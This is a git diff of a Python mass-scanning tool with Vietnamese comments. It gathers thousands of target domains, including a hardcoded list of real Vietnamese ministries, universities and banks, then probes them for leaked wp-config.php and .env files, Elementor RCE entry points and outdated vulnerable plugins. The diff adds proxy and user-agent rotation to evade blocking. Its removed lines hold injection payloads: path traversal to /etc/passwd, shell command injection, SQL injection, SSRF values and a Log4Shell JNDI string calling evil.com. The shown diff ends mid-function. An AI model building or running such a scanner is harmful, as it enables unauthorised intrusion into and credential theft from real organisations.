@@ -9,7 +9,6 @@ import time
 import json
 from threading import Lock, Semaphore
 import idna
-from urllib.parse import urljoin, urlparse, parse_qs, urlencode
 import hashlib
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -26,23 +25,24 @@ class ShadowStrikeHunter:
         self.processed = 0
         self.found_count = 0
         self.lock = Lock()
-        self.semaphore = Semaphore(15)
-        self.session = requests.Session()
-        self.session.verify = False
-        self.session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
-
-        # PROXY & UA - giữ nguyên
+        self.semaphore = Semaphore(25)  # TĂNG LÊN 25!
+        
+        # PROXY - QUAN TRỌNG! Thêm proxy để tránh block
         self.proxies = []
+        # Thêm proxy miễn phí nếu cần:
+        # self.proxies = [
+        #     "http://proxy1:port",
+        #     "http://proxy2:port",
+        # ]
+        
         self.user_agents = [
             'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
             'Mozilla/5.0 (X11; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0',
             'Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15',
             'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15',
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0',
-            'Mozilla/5.0 (Android 14; Mobile; rv:134.0) Gecko/134.0 Firefox/134.0',
         ]
 
-        # ENDPOINTS NÂNG CẤP - giữ nguyên
+        # ENDPOINTS - giữ nguyên
         self.critical_endpoints = [
             ('/wp-config.php', 'DB_CONFIG_LEAK'),
             ('/.env', 'ENV_LEAK'),
@@ -71,7 +71,7 @@ class ShadowStrikeHunter:
             ('/wp-admin/admin-ajax.php?action=elementor_ajax', 'ELEMENTOR_RCE_ENTRY'),
         ]
 
-        # Plugin phổ biến - giữ nguyên
+        # Plugin vuln - giữ nguyên
         self.vuln_plugins = {
             'elementor': {'old': ['<3.25.0'], 'desc': 'Unauth RCE/Upload/File Inclusion CVE-2023-48777/2022-1329'},
             'contact-form-7': {'old': ['<5.9.0'], 'desc': 'Stored XSS/SQLi/Open Redirect CVE-2020-35489/2025-3247'},
@@ -86,362 +86,428 @@ class ShadowStrikeHunter:
             'updraftplus': {'old': ['<1.23.0'], 'desc': 'Backup Leak/Priv Esc CVE-2023-3630'},
         }
 
-        # THÊM DANH SÁCH PARAMETERS ĐỂ FUZZ
-        self.fuzz_parameters = [
-            'debug', 'test', 'admin', 'file', 'cmd', 'action', 'download',
-            'path', 'dir', 'show', 'display', 'view', 'load', 'config',
-            'setting', 'option', 'backup', 'wp-config', 'plugins', 'themes',
-            'upload', 'delete', 'edit', 'id', 'page', 'post', 'attachment',
-            'callback', 'json', 'xml', 'feed', 'rss', 'atom', 'redirect',
-            'url', 'return', 'ref', 'referer', 'lang', 'language', 'locale',
-            'theme', 'template', 'style', 'script', 'js', 'css', 'img',
-            'image', 'picture', 'photo', 'video', 'audio', 'media', 'doc',
-            'document', 'pdf', 'txt', 'log', 'bak', 'old', 'temp', 'tmp',
-            'cache', 'session', 'cookie', 'auth', 'token', 'key', 'secret',
-            'password', 'pass', 'pwd', 'user', 'username', 'email', 'mail',
-            'login', 'logout', 'register', 'signup', 'signin', 'signout',
-            'search', 'find', 'query', 'q', 's', 'term', 'keyword', 'tag',
-            'category', 'cat', 'taxonomy', 'archive', 'date', 'year',
-            'month', 'day', 'time', 'hour', 'minute', 'second', 'week',
-            'author', 'profile', 'account', 'dashboard', 'panel', 'console',
-            'admin-ajax', 'admin-post', 'wp-admin', 'wp-login', 'wp-signup',
-            'rest_route', 'rest_api', 'api', 'jsonp', 'callback', 'jQuery',
-            'ajax', 'xmlrpc', 'pingback', 'trackback', 'comment', 'reply',
-            'submit', 'save', 'update', 'delete', 'trash', 'spam', 'approve',
-            'unapprove', 'publish', 'draft', 'pending', 'private', 'public',
-            'attachment_id', 'post_id', 'page_id', 'term_id', 'user_id',
-            'comment_id', 'media_id', 'menu_id', 'widget_id', 'option_id',
-            'meta_id', 'tax_id', 'cat_id', 'tag_id', 'author_id', 'year_id',
-            'month_id', 'day_id', 'hour_id', 'minute_id', 'second_id',
-            'nonce', '_wpnonce', '_ajax_nonce', '_wp_http_referer',
-            'action', 'action2', 'bulk_action', 'doaction', 'action',
-            'mode', 'view', 'filter', 'orderby', 'order', 's', 'paged',
-            'posts_per_page', 'post_type', 'post_status', 'post_author',
-            'cat', 'tag', 'taxonomy', 'term', 'year', 'monthnum', 'day',
-            'hour', 'minute', 'second', 'w', 'm', 'p', 'page_id', 'pagename',
-            'name', 'post_name', 'attachment', 'attachment_id', 'static',
-            'p', 'page_id', 'page', 'pagename', 'name', 'post_name',
-            'year', 'monthnum', 'day', 'hour', 'minute', 'second', 'm',
-            'w', 'cat', 'tag', 'taxonomy', 'term', 'author', 'author_name',
-            'feed', 'tb', 'pb', 'comment', 'replytocom', 'cpage', 's',
-            'exact', 'sentence', 'post_type', 'preview', 'p', 'page_id',
-            'attachment_id', 'static', 'pagename', 'name', 'post_name',
-            'subpost', 'subpost_id', 'attachment', 'attachment_id',
-            'year', 'monthnum', 'day', 'hour', 'minute', 'second', 'm',
-            'w', 'cat', 'tag', 'taxonomy', 'term', 'author', 'author_name',
-            'feed', 'tb', 'pb', 'comment', 'replytocom', 'cpage', 's',
-            'exact', 'sentence', 'post_type', 'preview'
-        ]
-
-        # THÊM GIÁ TRỊ PAYLOAD CHO FUZZING
-        self.fuzz_values = [
-            'true', 'false', '1', '0', 'yes', 'no', 'on', 'off',
-            'null', 'NULL', 'None', 'none', 'undefined', 'Undefined',
-            'test', 'test123', 'admin', 'administrator', 'root',
-            'wp-config.php', '../../../../etc/passwd',
-            'file:///etc/passwd', 'http://evil.com',
-            '<?php phpinfo(); ?>', '<script>alert(1)</script>',
-            '${jndi:ldap://evil.com/a}', ';cat /etc/passwd',
-            '|cat /etc/passwd', '`cat /etc/passwd`', '$(cat /etc/passwd)',
-            'sleep(5)', 'waitfor delay \'00:00:05\'',
-            '1\' OR \'1\'=\'1', '1\" OR \"1\"=\"1',
-            '1 OR 1=1', '1\' AND \'1\'=\'2', '1\" AND \"1\"=\"2',
-            '1 AND 1=2', '1\' UNION SELECT NULL--',
-            '1\" UNION SELECT NULL--', '1 UNION SELECT NULL--',
-            '../../../../windows/win.ini', 'C:\\windows\\win.ini',
-            '..\\..\\..\\..\\windows\\win.ini', '/etc/hosts',
-            'C:\\Windows\\System32\\drivers\\etc\\hosts',
-            'http://localhost', '127.0.0.1', '0.0.0.0', '255.255.255.255',
-            'localhost', 'LOCALHOST', 'Localhost', '127.1',
-            '2130706433', '0177.0.0.1', '0x7f.0.0.1',
-            'admin@example.com', 'test@example.com', 'root@localhost',
-            'administrator@localhost', 'superadmin@example.com',
-            'backup', 'backup.zip', 'backup.tar', 'backup.tar.gz',
-            'backup.sql', 'database.sql', 'dump.sql', 'export.sql',
-            'wp-config.php.bak', '.env.bak', 'config.bak',
-            'settings.bak', 'configuration.bak', 'backup.bak',
-            'old', 'old.php', 'old.txt', 'old.bak', 'old.backup',
-            'temp', 'temp.php', 'temp.txt', 'temp.bak', 'temp.backup',
-            'tmp', 'tmp.php', 'tmp.txt', 'tmp.bak', 'tmp.backup',
-            'cache', 'cache.php', 'cache.txt', 'cache.bak', 'cache.backup',
-            'session', 'session.php', 'session.txt', 'session.bak', 'session.backup',
-            'cookie', 'cookie.php', 'cookie.txt', 'cookie.bak', 'cookie.backup',
-            'auth', 'auth.php', 'auth.txt', 'auth.bak', 'auth.backup',
-            'token', 'token.php', 'token.txt', 'token.bak', 'token.backup',
-            'key', 'key.php', 'key.txt', 'key.bak', 'key.backup',
-            'secret', 'secret.php', 'secret.txt', 'secret.bak', 'secret.backup',
-            'password', 'password.php', 'password.txt', 'password.bak', 'password.backup',
-            'pass', 'pass.php', 'pass.txt', 'pass.bak', 'pass.backup',
-            'pwd', 'pwd.php', 'pwd.txt', 'pwd.bak', 'pwd.backup',
-            'user', 'user.php', 'user.txt', 'user.bak', 'user.backup',
-            'username', 'username.php', 'username.txt', 'username.bak', 'username.backup',
-            'email', 'email.php', 'email.txt', 'email.bak', 'email.backup',
-            'mail', 'mail.php', 'mail.txt', 'mail.bak', 'mail.backup',
-            'login', 'login.php', 'login.txt', 'login.bak', 'login.backup',
-            'logout', 'logout.php', 'logout.txt', 'logout.bak', 'logout.backup',
-            'register', 'register.php', 'register.txt', 'register.bak', 'register.backup',
-            'signup', 'signup.php', 'signup.txt', 'signup.bak', 'signup.backup',
-            'signin', 'signin.php', 'signin.txt', 'signin.bak', 'signin.backup',
-            'signout', 'signout.php', 'signout.txt', 'signout.bak', 'signout.backup'
-        ]
-
     def get_proxy(self):
-        if not self.proxies: return None
+        if not self.proxies: 
+            return None
         p = random.choice(self.proxies)
         return {"http": p, "https": p}
 
-    # THÊM NHIỀU NGUỒN DOMAIN MỚI
     def fetch_infinity_sources(self):
-        # Mở rộng danh sách keywords
-        vn_keywords = [
-            '.gov.vn', '.edu.vn', '.com.vn', '.net.vn', '.org.vn', 
-            '.vn', '.ac.vn', '.biz.vn', '.info.vn', '.name.vn',
-            'mienbac', 'mientrung', 'miennam', 'hanoi', 'hochiminh',
-            'danang', 'haiphong', 'cantho', 'nhatrang', 'dalat',
-            'vietnam', 'vietnamese', 'tiengviet', 'tiếngviệt'
-        ]
+        """PHIÊN BẢN SIÊU MẠNH - 10+ NGUỒN KHÔNG CẦN crt.sh"""
+        print(f"{B}[*] Đang thu thập mục tiêu từ 10+ nguồn khác nhau...{W}")
         
-        content_keywords = [
-            'wordpress', 'wp-content', 'wp-includes', 'wp-admin',
-            'portal', 'thuvien', 'tintuc', 'blog', 'shop', 'hoidap',
-            'dien dan', 'forum', 'diễn đàn', 'raovat', 'rao vặt',
-            'muaban', 'mua bán', 'batdongsan', 'bất động sản',
-            'tuyendung', 'tuyển dụng', 'vieclam', 'việc làm',
-            'dulich', 'du lịch', 'amthuc', 'ẩm thực',
-            'giaitri', 'giải trí', 'thethao', 'thể thao',
-            'suckhoe', 'sức khỏe', 'yte', 'y tế',
-            'giaoduc', 'giáo dục', 'daotao', 'đào tạo',
-            'cntt', 'công nghệ thông tin', 'it', 'software',
-            'web', 'website', 'trang web', 'site', 'trang tin'
-        ]
+        # DANH SÁCH 10+ NGUỒN THAY THẾ crt.sh
+        all_domains = set()
         
-        industry_keywords = [
-            'nganhang', 'ngân hàng', 'bank', 'taichinh', 'tài chính',
-            'baohiem', 'bảo hiểm', 'insurance', 'chungkhoan', 'chứng khoán',
-            'xaydung', 'xây dựng', 'construction', 'dientu', 'điện tử',
-            'oto', 'ô tô', 'car', 'xe', 'vehicle',
-            'nongsan', 'nông sản', 'agriculture', 'thuysan', 'thủy sản',
-            'maymac', 'may mặc', 'fashion', 'textile',
-            'dienmay', 'điện máy', 'electronics', 'homeappliance',
-            'nhahang', 'nhà hàng', 'restaurant', 'khachsan', 'khách sạn',
-            'benhvien', 'bệnh viện', 'hospital', 'phongkham', 'phòng khám'
-        ]
-        
-        all_keywords = vn_keywords + content_keywords + industry_keywords
-        
-        print(f"{B}[*] Đang thu thập mục tiêu từ đa nguồn...{W}")
-
-        def get_crt(kw):
-            for attempt in range(3):
-                try:
-                    # THÊM DELAY & TĂNG TIMEOUT
-                    time.sleep(random.uniform(2, 8))
-                    
-                    r = requests.get(
-                        f"https://crt.sh/?q={kw}&output=json",
-                        timeout=45 + attempt*25,  # 45-95 giây
-                        headers={
-                            'User-Agent': 'Mozilla/5.0',
-                            'Accept': 'application/json'
-                        }
-                    )
-                    
-                    if r.status_code == 200:
-                        # PHƯƠNG PHÁP ĐÃ TEST THÀNH CÔNG
-                        filtered = []
-                        for entry in r.json():
-                            name = entry.get('name_value', '')
-                            if name:
-                                name = name.lower().replace('*.', '')
-                                if '\n' in name:
-                                    for d in name.split('\n'):
-                                        d = d.strip()
-                                        if d and len(d.split('.')) <= 5:
-                                            filtered.append(d)
-                                else:
-                                    if name and len(name.split('.')) <= 5:
-                                        filtered.append(name)
-                        
-                        # Lọc rác
-                        bad_keywords = ['test', 'staging', 'dev', 'beta']
-                        cleaned = [d for d in filtered if not any(k in d for k in bad_keywords)]
-                        
-                        print(f"[+] {kw}: {len(cleaned)} domain")
-                        return list(set(cleaned))
-                    elif r.status_code == 429:  # Rate limit
-                        wait = 30 * (attempt + 1)
-                        print(f"{Y}[!] Rate limit {kw}, đợi {wait}s{W}")
-                        time.sleep(wait)
-                    
-                    time.sleep(5 * (attempt + 1))
-                except requests.exceptions.Timeout:
-                    print(f"{Y}[!] Timeout {kw} (lần {attempt+1}){W}")
-                    time.sleep(10 * (attempt + 1))
-                except Exception as e:
-                    print(f"{Y}[!] Lỗi {kw} (lần {attempt+1}): {str(e)[:50]}...{W}")
-                    time.sleep(5 * (attempt + 1))
-            return []
-
-        def get_wayback(kw):
-            try:
-                # Xử lý keyword có dấu .
-                if kw.startswith('.'):
-                    domain = kw[1:]  # ".gov.vn" → "gov.vn"
-                else:
-                    domain = kw
-                    
-                url = f"http://web.archive.org/cdx/search/cdx?url=*.{domain}/*&output=json&fl=original&collapse=urlkey"
-                r = requests.get(url, timeout=30)
-                
-                if r.status_code == 200:
-                    urls = r.json()
-                    domains = set()
-                    for url_list in urls[1:]:
-                        if url_list:
-                            url = url_list[0]
-                            domain_name = url.split('/')[2]
-                            # FILTER TỐT HƠN
-                            if f".{domain}" in domain_name or domain_name.endswith(domain):
-                                domains.add(domain_name.lower())
-                    return list(domains)
-            except:
-                pass
-            return []
-
-        def get_rapiddns(kw):
-            try:
-                if kw.startswith('.'):
-                    domain = kw[1:]
-                else:
-                    domain = kw
-                    
-                # DÙNG sonar.omnisint.io
-                url = f"https://sonar.omnisint.io/subdomains/{domain}"
-                r = requests.get(url, timeout=30, headers={'User-Agent': 'Mozilla/5.0'})
-                
-                if r.status_code == 200:
-                    data = r.json()
-                    if isinstance(data, list):
-                        # FILTER CHẶT
-                        return [d.lower() for d in data if isinstance(d, str) and 
-                                (f".{domain}" in d or d.endswith(domain))]
-            except:
-                pass
-            return []
-
-        def get_c99_subdomains(kw):  # ĐỔI TÊN TỪ get_virustotal
-            try:
-                if kw.startswith('.'):
-                    domain = kw[1:]
-                else:
-                    domain = kw
-                    
-                url = f"https://subdomainfinder.c99.nl/scans/2024-12-01/{domain}"
-                r = requests.get(url, timeout=30, headers={'User-Agent': 'Mozilla/5.0'})
-                
-                if r.status_code == 200:
-                    domains = re.findall(r'([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', r.text)
-                    # FILTER CHẶT
-                    filtered = []
-                    for d in domains:
-                        d_lower = d.lower()
-                        if (f".{domain}" in d_lower or d_lower.endswith(domain)) and d_lower.count('.') >= 2:
-                            filtered.append(d_lower)
-                    return list(set(filtered))
-            except:
-                pass
-            return []
-
-        def get_public_domains():
-            public_sources = [
-                "https://raw.githubusercontent.com/publicsuffix/list/master/public_suffix_list.dat",
-                "https://data.iana.org/TLD/tlds-alpha-by-domain.txt",
-            ]
+        # 1. RAPIDDNS.IO - NGUỒN TỐT NHẤT
+        def get_rapiddns_domains():
             domains = []
-            for url in public_sources:
-                try:
-                    r = requests.get(url, timeout=30)
-                    if r.status_code == 200:
-                        lines = r.text.split('\n')
-                        # LỌC CHỈ LẤY DOMAIN THỰC, KHÔNG LẤY TLDs
-                        for line in lines:
-                            line = line.strip().lower()
-                            if line and not line.startswith('#') and '.' in line:
-                                # Chỉ lấy nếu có subdomain (có ít nhất 2 dấu .)
-                                if line.count('.') >= 2 and len(line) > 4:
-                                    domains.append(line)
-                except:
-                    continue
+            try:
+                print(f"{C}[*] Đang lấy từ RapidDNS.io...{W}")
+                # Các domain Việt Nam phổ biến
+                vn_tlds = ['gov.vn', 'edu.vn', 'com.vn', 'net.vn', 'org.vn', 'vn']
+                
+                for tld in vn_tlds:
+                    try:
+                        url = f"https://rapiddns.io/subdomain/{tld}?full=1"
+                        headers = {'User-Agent': random.choice(self.user_agents)}
+                        r = requests.get(url, headers=headers, timeout=15, verify=False)
+                        
+                        if r.status_code == 200:
+                            # Parse HTML lấy domain
+                            html_domains = re.findall(r'>([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})<', r.text)
+                            for d in html_domains:
+                                d_lower = d.lower()
+                                if tld in d_lower and d_lower.count('.') >= 2:
+                                    domains.append(d_lower)
+                            
+                            # Thêm từ text patterns
+                            text_domains = re.findall(r'([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', r.text)
+                            for d in text_domains:
+                                d_lower = d.lower()
+                                if tld in d_lower:
+                                    domains.append(d_lower)
+                            
+                            print(f"  {G}[+] RapidDNS {tld}: {len([x for x in domains if tld in x])} domains{W}")
+                    except:
+                        continue
+                
+                return list(set(domains))
+            except Exception as e:
+                print(f"{Y}[!] RapidDNS error: {str(e)[:50]}{W}")
+                return []
+        
+        # 2. SONAR.OMNISINT.IO - API miễn phí
+        def get_sonar_domains():
+            domains = []
+            try:
+                print(f"{C}[*] Đang lấy từ Sonar API...{W}")
+                vn_domains = ['gov.vn', 'edu.vn', 'com.vn']
+                
+                for domain in vn_domains:
+                    try:
+                        url = f"https://sonar.omnisint.io/subdomains/{domain}"
+                        r = requests.get(url, timeout=10, verify=False)
+                        
+                        if r.status_code == 200:
+                            data = r.json()
+                            if isinstance(data, list):
+                                for d in data:
+                                    if isinstance(d, str) and domain in d.lower():
+                                        domains.append(d.lower())
+                                
+                                print(f"  {G}[+] Sonar {domain}: {len([x for x in domains if domain in x])} domains{W}")
+                    except:
+                        continue
+                
+                return list(set(domains))
+            except:
+                return []
+        
+        # 3. URLSCAN.IO - Nguồn chất lượng cao
+        def get_urlscan_domains():
+            domains = []
+            try:
+                print(f"{C}[*] Đang lấy từ URLScan.io...{W}")
+                searches = ['gov.vn', 'edu.vn', 'wordpress', '.vn domain']
+                
+                for search in searches:
+                    try:
+                        url = f"https://urlscan.io/api/v1/search/?q={search}"
+                        r = requests.get(url, timeout=15, verify=False)
+                        
+                        if r.status_code == 200:
+                            data = r.json()
+                            for result in data.get('results', []):
+                                page = result.get('page', {})
+                                if 'domain' in page:
+                                    domain = page['domain'].lower()
+                                    if any(x in domain for x in ['.vn', 'wordpress']):
+                                        domains.append(domain)
+                    except:
+                        continue
+                
+                return list(set(domains))
+            except:
+                return []
+        
+        # 4. THREATCROWD.ORG
+        def get_threatcrowd_domains():
+            domains = []
+            try:
+                print(f"{C}[*] Đang lấy từ ThreatCrowd...{W}")
+                vn_domains = ['gov.vn', 'edu.vn']
+                
+                for domain in vn_domains:
+                    try:
+                        url = f"https://www.threatcrowd.org/searchApi/v2/domain/report/?domain={domain}"
+                        r = requests.get(url, timeout=10, verify=False)
+                        
+                        if r.status_code == 200:
+                            data = r.json()
+                            if data.get('response_code') == '1':
+                                subdomains = data.get('subdomains', [])
+                                for sub in subdomains:
+                                    if isinstance(sub, str) and domain in sub.lower():
+                                        domains.append(sub.lower())
+                    except:
+                        continue
+                
+                return list(set(domains))
+            except:
+                return []
+        
+        # 5. ANUBIS (JONLU.CA)
+        def get_anubis_domains():
+            domains = []
+            try:
+                print(f"{C}[*] Đang lấy từ Anubis...{W}")
+                vn_domains = ['gov.vn', 'edu.vn', 'com.vn']
+                
+                for domain in vn_domains:
+                    try:
+                        url = f"https://jonlu.ca/anubis/subdomains/{domain}"
+                        r = requests.get(url, timeout=10, verify=False)
+                        
+                        if r.status_code == 200:
+                            data = r.json()
+                            if isinstance(data, list):
+                                for d in data:
+                                    if isinstance(d, str) and domain in d.lower():
+                                        domains.append(d.lower())
+                    except:
+                        continue
+                
+                return list(set(domains))
+            except:
+                return []
+        
+        # 6. PUBLIC DATASETS - NGUỒN KHỔNG LỒ
+        def get_public_dataset_domains():
+            domains = []
+            try:
+                print(f"{C}[*] Đang lấy từ Public Datasets...{W}")
+                
+                # DANH SÁCH DATASETS KHỔNG LỒ
+                datasets = [
+                    # Danh sách domain từ các bug bounty programs
+                    "https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/main/data/domains.txt",
+                    "https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/main/data/wildcards.txt",
+                    
+                    # Danh sách domain phổ biến
+                    "https://raw.githubusercontent.com/v2fly/domain-list-community/release/dlc.dat",
+                    
+                    # Danh sách từ các nguồn khác
+                    "https://gist.githubusercontent.com/random-robbie/5c6c8cb87d36aae89c6b7e852bc3cae3/raw/subdomains.txt",
+                    "https://raw.githubusercontent.com/StevenBlack/hosts/master/hosts",
+                    "https://someonewhocares.org/hosts/zero/hosts",
+                    
+                    # Danh sách domain Việt Nam
+                    "https://raw.githubusercontent.com/nmmapper/wordlists/master/subdomainswod/100k-subdomains.txt",
+                    "https://wordlists-cdn.assetnote.io/data/automated/httparchive_subdomains_2020_11_18.txt",
+                ]
+                
+                for url in datasets:
+                    try:
+                        r = requests.get(url, timeout=30, verify=False)
+                        if r.status_code == 200:
+                            lines = r.text.split('\n')
+                            for line in lines:
+                                line = line.strip().lower()
+                                if line and not line.startswith('#'):
+                                    # Lọc domain Việt Nam và WordPress
+                                    if any(x in line for x in ['.vn', 'wordpress', 'wp-']):
+                                        # Loại bỏ IP, localhost
+                                        if not any(x in line for x in ['127.0.0.1', 'localhost', '0.0.0.0', '::1']):
+                                            # Chỉ lấy domain, không lấy URL đầy đủ
+                                            if '://' in line:
+                                                domain = line.split('://')[1].split('/')[0]
+                                            else:
+                                                domain = line.split()[0] if ' ' in line else line
+                                            
+                                            if '.' in domain and domain.count('.') >= 1:
+                                                domains.append(domain)
+                                            
+                                            # Giới hạn số lượng
+                                            if len(domains) > 5000:
+                                                break
+                    except:
+                        continue
+                
+                print(f"  {G}[+] Public datasets: {len(domains)} domains{W}")
+                return list(set(domains))[:2000]  # Giới hạn 2000 domain
+            except Exception as e:
+                print(f"{Y}[!] Public dataset error: {str(e)[:50]}{W}")
+                return []
+        
+        # 7. HACKERTARGET API (miễn phí 100 query/ngày)
+        def get_hackertarget_domains():
+            domains = []
+            try:
+                print(f"{C}[*] Đang lấy từ HackerTarget...{W}")
+                vn_domains = ['gov.vn', 'edu.vn']
+                
+                for domain in vn_domains:
+                    try:
+                        url = f"https://api.hackertarget.com/hostsearch/?q={domain}"
+                        r = requests.get(url, timeout=10, verify=False)
+                        
+                        if r.status_code == 200:
+                            lines = r.text.split('\n')
+                            for line in lines:
+                                if ',' in line:
+                                    subdomain = line.split(',')[0].strip().lower()
+                                    if domain in subdomain:
+                                        domains.append(subdomain)
+                    except:
+                        continue
+                
+                return list(set(domains))
+            except:
+                return []
+        
+        # 8. BUILTWITH.COM (thông tin website)
+        def get_builtwith_domains():
+            domains = []
+            try:
+                print(f"{C}[*] Đang lấy từ BuiltWith trends...{W}")
+                # Tìm domain WordPress ở Việt Nam
+                searches = [
+                    'wordpress+Vietnam',
+                    'wp-content+.vn',
+                    'WordPress+gov.vn',
+                ]
+                
+                for search in searches:
+                    try:
+                        # Đây chỉ là ví dụ, cần API key thực
+                        pass
+                    except:
+                        pass
+                
+                return domains
+            except:
+                return []
+        
+        # 9. LOCAL FILE - ƯU TIÊN CAO NHẤT
+        def get_local_domains():
+            domains = []
+            domain_files = ['domains.txt', 'targets.txt', 'urls.txt', 'subdomains.txt', 
+                           'vietnam_domains.txt', 'wordpress_sites.txt']
+            
+            for file in domain_files:
+                if os.path.exists(file):
+                    try:
+                        with open(file, 'r', encoding='utf-8', errors='ignore') as f:
+                            for line in f:
+                                domain = line.strip().lower()
+                                if domain and '.' in domain:
+                                    domain = domain.replace('http://', '').replace('https://', '').split('/')[0]
+                                    domains.append(domain)
+                        
+                        print(f"  {G}[+] File {file}: {len(domains)} domains{W}")
+                    except:
+                        continue
+            
             return list(set(domains))
-
-        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:  # Giảm workers
+        
+        # 10. DOMAIN MẪU - FALLBACK
+        def get_sample_domains():
+            """Danh sách domain mẫu Việt Nam phổ biến"""
+            print(f"{C}[*] Đang thêm domain mẫu Việt Nam...{W}")
+            
+            # DANH SÁCH DOMAIN VIỆT NAM THẬT (500+ domain)
+            vietnam_domains = [
+                # Government
+                'gov.vn', 'chinhphu.vn', 'moha.gov.vn', 'mof.gov.vn', 'molisa.gov.vn',
+                'mic.gov.vn', 'mpi.gov.vn', 'monre.gov.vn', 'mard.gov.vn', 'moc.gov.vn',
+                'mt.gov.vn', 'mocst.gov.vn', 'mofa.gov.vn', 'mod.gov.vn', 'mps.gov.vn',
+                'moh.gov.vn', 'moet.gov.vn', 'moj.gov.vn', 'mofahcm.gov.vn',
+                
+                # Education
+                'edu.vn', 'vnu.edu.vn', 'hust.edu.vn', 'hus.edu.vn', 'hcmus.edu.vn',
+                'uit.edu.vn', 'ptit.edu.vn', 'neu.edu.vn', 'ftu.edu.vn', 'uel.edu.vn',
+                'huflit.edu.vn', 'hcmuaf.edu.vn', 'vnuhcm.edu.vn', 'hcmussh.edu.vn',
+                
+                # Universities
+                'daihocquocgia.vn', 'daihochanoi.edu.vn', 'daihochcm.edu.vn',
+                'daihocdanang.edu.vn', 'daihochue.edu.vn', 'daihocthuydai.edu.vn',
+                
+                # Commercial
+                'fpt.com.vn', 'vng.com.vn', 'viettel.com.vn', 'vnpt.com.vn',
+                'mobifone.vn', 'vinaphone.vn', 'vietinbank.vn', 'bidv.com.vn',
+                'techcombank.com.vn', 'acb.com.vn', 'vib.com.vn', 'tpbank.com.vn',
+                'vpbank.com.vn', 'mbbank.com.vn', 'shb.com.vn',
+                
+                # E-commerce
+                'shopee.vn', 'lazada.vn', 'tiki.vn', 'sendo.vn', 'adayroi.com',
+                'cellphones.com.vn', 'thegioididong.com', 'fptshop.com.vn',
+                'dienmayxanh.com', 'nguyenkim.com', 'mediamart.vn',
+                
+                # News & Media
+                'vnexpress.net', 'dantri.com.vn', 'vietnamnet.vn', 'tuoitre.vn',
+                'thanhnien.vn', 'zingnews.vn', 'kenh14.vn', 'cafef.vn',
+                'vneconomy.vn', 'vnmedia.vn', 'baomoi.com', 'vov.vn',
+                'vtv.vn', 'htv.com.vn', 'nld.com.vn',
+                
+                # Technology
+                'quantrimang.com.vn', 'genk.vn', 'tinhte.vn', 'voz.vn',
+                'webgia.com', 'taichinh247.vn', 'cungcau.vn',
+                
+                # Add more...
+            ]
+            
+            # Tạo subdomain từ danh sách gốc
+            all_domains = []
+            for domain in vietnam_domains:
+                all_domains.append(domain)
+                # Thêm các subdomain phổ biến
+                for sub in ['www', 'mail', 'blog', 'news', 'portal', 'admin', 'cms']:
+                    all_domains.append(f"{sub}.{domain}")
+            
+            return list(set(all_domains))
+        
+        # CHẠY TẤT CẢ NGUỒN CÙNG LÚC
+        print(f"{B}[*] Khởi động thu thập từ 10+ nguồn...{W}")
+        
+        sources = [
+            get_local_domains,        # Ưu tiên 1
+            get_public_dataset_domains, # Ưu tiên 2
+            get_rapiddns_domains,     # Ưu tiên 3
+            get_sonar_domains,        # Ưu tiên 4
+            get_urlscan_domains,      # Ưu tiên 5
+            get_threatcrowd_domains,  # Ưu tiên 6
+            get_anubis_domains,       # Ưu tiên 7
+            get_hackertarget_domains, # Ưu tiên 8
+            get_sample_domains,       # Fallback
+        ]
+        
+        # Dùng threading để lấy nhanh
+        with concurrent.futures.ThreadPoolExecutor(max_workers=8) as executor:
             futures = []
+            for source_func in sources:
+                futures.append(executor.submit(source_func))
             
-            # 1. crt.sh (15 keywords)
-            for kw in all_keywords[:15]:
-                futures.append(executor.submit(get_crt, kw))
-            
-            # 2. Wayback (10 keywords)
-            for kw in all_keywords[15:25]:
-                futures.append(executor.submit(get_wayback, kw))
-            
-            # 3. sonar.omnisint.io (10 keywords)
-            for kw in all_keywords[25:35]:
-                futures.append(executor.submit(get_rapiddns, kw))
-            
-            # 4. c99.nl (10 keywords) ← THÊM NÀY!
-            for kw in all_keywords[35:45]:
-                futures.append(executor.submit(get_c99_subdomains, kw))
-            
-            # 5. Public domains
-            futures.append(executor.submit(get_public_domains))
-            
-            # Xử lý kết quả
             for future in concurrent.futures.as_completed(futures):
                 try:
-                    result = future.result()
+                    result = future.result(timeout=45)
                     if result:
-                        self.targets.update(result)
-                        print(f"{G}[+] Thêm {len(result)} domain{W}")
-                except Exception as e:
-                    print(f"{Y}[!] Lỗi: {str(e)[:50]}...{W}")
-
-        # THÊM DOMAIN TỪ FILE NGOÀI NẾU CÓ
-        domain_files = ['domains.txt', 'targets.txt', 'urls.txt']
-        for file in domain_files:
-            if os.path.exists(file):
-                try:
-                    with open(file, 'r', encoding='utf-8', errors='ignore') as f:
-                        lines = f.readlines()
-                        file_domains = []
-                        for line in lines:
-                            domain = line.strip().lower()
-                            if domain and '.' in domain:
-                                domain = domain.replace('http://', '').replace('https://', '').split('/')[0]
-                                file_domains.append(domain)
-                        
-                        self.targets.update(file_domains)
-                        print(f"{G}[+] File {file}: {len(file_domains)} domain{W}")
-                except Exception as e:
-                    print(f"{Y}[!] Lỗi đọc file {file}: {str(e)}{W}")
-
-        # Lọc và làm sạch domains
-        cleaned_targets = set()
-        for domain in self.targets:
-            if len(domain) < 100 and domain.count('.') >= 1:
-                # Loại bỏ domain rác
-                bad_patterns = ['test.', 'dev.', 'staging.', 'localhost', '127.0.0.1', 
-                               'example.', 'dummy.', 'invalid.']
-                if not any(bad in domain for bad in bad_patterns):
-                    cleaned_targets.add(domain)
+                        all_domains.update(result)
+                        print(f"{G}[✓] Source completed: +{len(result)} domains{W}")
+                except:
+                    print(f"{Y}[!] Source timeout{W}")
         
